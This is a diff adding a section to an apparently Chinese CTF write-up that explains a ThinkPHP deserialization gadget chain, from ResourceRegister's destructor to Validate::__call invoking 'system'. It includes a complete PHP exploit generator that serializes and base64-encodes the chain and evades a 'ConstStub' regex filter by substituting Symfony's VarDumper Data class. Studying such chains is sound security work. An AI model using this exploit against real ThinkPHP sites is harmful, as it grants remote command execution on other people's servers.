@@ -77,6 +77,240 @@ SSRF：此处只禁用了 `file:///` 协议，使用 `gopher://` 协议可以经
 ### tp
 
 docker 配置远程 PHP 解释器（见[文章](/2024/08/14/记一次-docker-配置远程-PHP-解释器/)）
+[原始调用链](https://xz.aliyun.com/t/14904?time__1311=GqAh0K8KAKGNDQtiQGkDRDIhWL04ehnmD)
+
+构造的调用链起点为 `class ResourceRegister->__destruct()`，进入 `class Resource->parseGroupRule()` 后在 `str_replace` 中触发某个 tostring 方法。
+构造的调用链终点为 `class Validate->is()` 中的匿名函数，通过其中的 `$result = call_user_func_array($this->type[$rule], [$value]);` 完成 RCE. 为了到达这个匿名函数，需要调用 `class Validate->__call()`，这需要在外层找到一个调用 `class Validate->/*unknown method*/` 的入口。
+框架中实现了 `trait Conversion->__tostring()`，在调用到 `appendAttrToArray` 进入 `getRelationWith` 时，可以通过 `$relation->visible($visible[$key])` 触发 `__call()` 方法。
+
+```php
+public function parseGroupRule($rule): void
+    {
+        $option = $this->option;
+        $origin = $this->router->getGroup();
+        $this->router->setGroup($this);
+
+        if (str_contains($rule, '.')) {
+            $array = explode('.', $rule);
+            $last  = array_pop($array); # 构造 $rule
+            $item  = [];
+            foreach ($array as $val) {
+                $item[] = $val . '/<' . ($option['var'][$val] ?? $val . '_id') . '>';
+            }
+            $rule = implode('/', $item) . '/' . $last;
+        }
+        foreach ($this->rest as $key => $val) {
+            # 构造 $this->rest
+            if (isset($last) && 
+                str_contains($val[1], '<id>') && 
+                isset($option['var'][$last])) {
+                    $val[1] = str_replace('<id>', '<' . $option['var'][$last] . '>', $val[1]);
+            # 构造 $option['var'][$last]
+```
+
+从调用链的开头开始，`class ResourceRegister->register()` 的 `getRule()` 参数引用的 `$rule` 值是一个可以在初始化时指定的值。为了能够触发 tostring 方法，`parseGroupRule()` 中引用的 `$option = $this->option;` 也需要是一个能满足 `isset($option['var'][$last])` 的值，其中 `$last  = array_pop(explode('.', $rule));`，说明构造的 `$rule` 应该为 `str1.str2` 的形式，这样会有 `$last=str2`，所以必须构造 `$option=['var' => [str2 => val1]]`；另一个条件为 `str_contains($val[1], '<id>')`，说明 `$val=[1 => '<id>']` 而 `foreach ($this->rest as $key => $val)` 说明此处的 `$this->rest=[val2 => [1 => '<id>']]`，才能满足这个 if 的所有条件，触发 tostring。由于 if 内部的赋值为 `$val[1] = str_replace('<id>', '<' . $option['var'][$last] . '>', $val[1]);`，故触发 tostring 的对象为 `$option['var'][$last]`，即 `val1`，所以需要让 `val1` 的构造符合后续调用链的运行要求。
+
+```php
+protected function getRelationWith(string $key, array $hidden, array $visible)
+{
+    $relation = $this->getRelation($key, true);
+    if ($relation) {
+        if (isset($visible[$key])) {
+            $relation->visible($visible[$key]);
+            ...
+public function __call($method, $args)
+{
+    array_push($args, lcfirst($method)); # [$args, $method]
+    return call_user_func_array([$this, 'is'], $args);
+}
+public function is($value, string $rule, array $data = []): bool
+{ # $value=$args, $rule=$method='visible'
+    $call = function ($value, $rule) {
+        if (isset($this->type[$rule])) {
+            $result = call_user_func_array($this->type[$rule], [$value]);
+```
+
+在后续的 `__call` 方法之前，调用了 `$relation->visible($visible[$key]);`，所以为了调用 `class Validate->is()`，需要调用 `class Validate->__call()`，所以此处的 `$relation` 需要是一个 `class Validate` 对象。这个对象会成为后续 call 调用链中的 `$this`。调用了 `__call('visible', $visible[$key])` 之后，会进入 `is($visible[$key], 'visible)`。因此，此处需要有 `$this->type=['visible' => 'system']`，而 `$visible[$key]` （属于前文中的 `val1`）需要是一个可以被字符串化为最终命令的对象，在下文中记为 `ObjCmd`。
+
+```php
+foreach ($this->append as $key => $name) {
+    $this->appendAttrToArray($item, $key, $name, $visible, $hidden);
+}
+protected function appendAttrToArray(array &$item, $key, array|string $name, array $visible, array $hidden): void
+{
+    if (str_contains($name, '.')) {
+        [$key, $attr] = explode('.', $name);
+        $relation = $this->getRelationWith($key, $hidden, $visible);
+        ...
+protected function getRelationWith(string $key, array $hidden, array $visible) # $key = str4, $hidden = null, $visible = [str4 => ObjCmd]
+{
+    $relation = $this->getRelation($key, true);
+    if ($relation) {
+```
+
+在中间部分的调用链中，暂时有 `$this=val1`。此时从 `toArray` 进入 `appendAttrToArray` 的过程中，需要有 `$this->append=[val3 => str3]`，进入 `appendAttrToArray(null, val3, str3, ObjCmd, null)`。要正常进入 `getRelationWith`，需要此处的 `str3` 为 `str4.str5` 的形式。为了能够在 `getRelationWith` 进入后续的调用链，需要此处的 `$relation` 能正常返回。根据上文，此处的 `$relation` 需要是一个 `class Validate` 对象，所以在 `getRelation` 中需要有 `$this->relation=[str4 => class Validate]`。
+
+总结以上要求，构造的初始对象暂时如下：
+
+```php
+class ResourceRegister {
+    $rule = str1 . str2;
+    $option = ['var' => [str2 => class something val1]]
+        # val1 is a __tostring() callee
+    $rest = ['123' => [1 => '<id>']]
+}
+class something val1 {
+    $append = [val3 => str4 . str5]
+    $visible = [str4 => ObjCmd]
+    $relation = [str4 => class Validate val2]
+}
+class Validate val2 {
+    $type=['visible' => 'system']
+}
+```
+
+此时，需要补全的还有 `val1` 的类型和 `ObjCmd` 的类型。原文中选择了使用 `class Pivot` 实现 `val1`，`class ConstStub` 实现 `ObjCmd`。
+
+```php
+class ConstStub {
+    public function __toString(): string {
+        return (string) $this->value;
+    }
+}
+abstract class Model implements JsonSerializable, ArrayAccess, Arrayable, Jsonable
+class Pivot extends Model {}
+```
+
+在本题中，由于 `if (preg_match("/ConstStub/i",$data)) die("哒咩");` 对解码后的序列化字符串进行了正则判断，不能直接使用 `class ConstStub` 进行命令行命令的存储。此处尝试使用 `class Data` 代替，相关代码如下：
+
+```php
+public function __toString(): string
+{
+    $value = $this->getValue();
+
+    if (!\is_array($value)) {
+        return (string) $value;
+    }
+    ...
+public function getValue(array|bool $recursive = false): string|int|float|bool|array|null
+{
+    $item = $this->data[$this->position][$this->key];
+
+    if ($item instanceof Stub && Stub::TYPE_REF === $item->type && !$item->position) {
+        $item = $item->value;
+    }
+    if (!($item = $this->getStub($item)) instanceof Stub) {
+        return $item;
+    }
+    ...
+private function getStub(mixed $item): mixed
+{
+    if (!$item || !\is_array($item)) {
+        return $item;
+    }
+```
+
+因此构造对象如下：
+
+```php
+class Data {
+    $position = 1;
+    $key = 2;
+    $data = [1 => [2 => cmd]];
+}
+```
+
+exp 根据原文修改如下：
+
+```php
+<?php
+namespace think\route{
+    class ResourceRegister{
+        public $resource;
+
+        public function __construct($resource) {
+            $this->resource = $resource;
+        }
+    }
+
+    class RuleGroup extends Rule{
+        public function __construct($rule, $router, $option){
+            parent::__construct($rule, $router, $option);
+        }
+    }
+
+    class Resource extends RuleGroup{
+        public function __construct($rule, $router, $option){
+            parent::__construct($rule, $router, $option);
+        }
+
+    }
+
+    abstract class Rule{ # chain part 1
+        public $rest = ['key' => [1 => '<id>']];
+        public $name = "name";
+        public $rule;
+        public $router;
+        public $option;
+
+        public function __construct($rule, $router, $option){
+            $this->rule = $rule;
+            $this->router = $router;
+            $this->option = ['var' => ['nivia' => $option]];
+        }
+    }
+}
+
+namespace think {
+    class Route{}
+    abstract class Model{
+        private $relation;
+        protected $append = ['Nivia' => "1.2"];
+
+        protected $visible;
+        public function __construct($visible, $call){
+            $this->visible = [1 => $visible];
+            $this->relation = ['1' => $call];
+        }
+    }
+
+    class Validate{
+        protected $type;
+
+        public function __construct(){
+            $this->type = ['visible' => "system"];//function
+        }
+    }
+}
+
+namespace think\model{
+    use think\Model;
+    class Pivot extends Model{ 
+    # chain part 2, Model is Jsonable, calling __tostring()
+        public function __construct($visible, $call){
+            parent::__construct($visible, $call);
+        }
+    }
+}
+
+namespace Symfony\Component\VarDumper\Cloner{
+	class Data {
+	    private $position = 1;
+	    private $key = 2;
+	    private $data = [1 => [2 => 'cat /flag']];
+	}
+}
+
+namespace {
+    $call = new think\Validate;
+    $option = new think\model\Pivot(new Symfony\Component\VarDumper\Cloner\Data, $call);
+    $router = new think\Route;
+    $resource = new think\route\Resource("abc.nivia", $router , $option);
+    $resourceRegister = new think\route\ResourceRegister($resource);
+    echo urlencode(base64_encode(serialize($resourceRegister)));
+    // echo serialize($resourceRegister);
+}
+```
 
 ## Pwn
 
